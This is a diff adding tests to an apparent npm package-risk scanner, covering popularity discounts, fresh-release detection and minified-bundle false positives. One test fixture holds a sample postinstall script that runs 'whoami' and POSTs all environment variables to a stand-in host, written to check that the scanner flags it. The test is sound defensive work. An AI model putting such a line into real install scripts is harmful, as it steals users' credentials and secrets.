@@ -58,6 +58,58 @@ test("brand-new package with env+network exfil pattern is suspicious", () => {
   assert.ok(report.score >= 50);
 });
 
+test("popularity discounts reputation findings on an old release", () => {
+  // esbuild-shaped: huge install base, postinstall that fetches a binary,
+  // release is months old. Should inform, not alarm.
+  const source = `const cp = require("child_process"); fetch(process.env.MIRROR);`;
+  const report = analyze(
+    fakePackage({
+      name: "established-bundler",
+      createdAt: daysAgo(1200),
+      versionPublishedAt: daysAgo(60),
+      weeklyDownloads: 50_000_000,
+      manifest: { scripts: { postinstall: "node install.js" }, dependencies: {} },
+      files: [{ name: "package/install.js", size: source.length, data: Buffer.from(source) }],
+    }),
+  );
+  assert.equal(report.verdict, "caution");
+  assert.ok(report.score < report.rawScore, "score should be discounted");
+});
+
+test("popularity does NOT excuse dangerous code in a fresh release", () => {
+  // Same package, same code — but published 6 hours ago. This is the
+  // compromised-maintainer shape; the install base must not hide it.
+  const source = `
+    const cp = require("child_process");
+    cp.execSync("whoami");
+    fetch("https://dead.invalid/t", { method: "POST", body: JSON.stringify(process.env) });
+  `;
+  const report = analyze(
+    fakePackage({
+      name: "established-bundler",
+      createdAt: daysAgo(1200),
+      versionPublishedAt: new Date(NOW - 6 * 3_600_000).toISOString(),
+      weeklyDownloads: 50_000_000,
+      manifest: { scripts: { postinstall: "node install.js" }, dependencies: {} },
+      files: [{ name: "package/install.js", size: source.length, data: Buffer.from(source) }],
+    }),
+  );
+  assert.equal(report.freshRelease, true);
+  assert.equal(report.verdict, "suspicious");
+});
+
+test("minified bundles don't trip obfuscation heuristics", () => {
+  const minified = `!function(){eval("${"QUJD".repeat(80)}")}();`;
+  const report = analyze(
+    fakePackage({
+      files: [
+        { name: "package/dist/lib.min.js", size: minified.length, data: Buffer.from(minified) },
+      ],
+    }),
+  );
+  assert.equal(report.findings.length, 0);
+});
+
 test("typosquat of a popular name is flagged", () => {
   const report = analyze(fakePackage({ name: "expresss" }));
   assert.ok(report.findings.some((f) => /typosquat|edits from/.test(f.title + f.detail)));
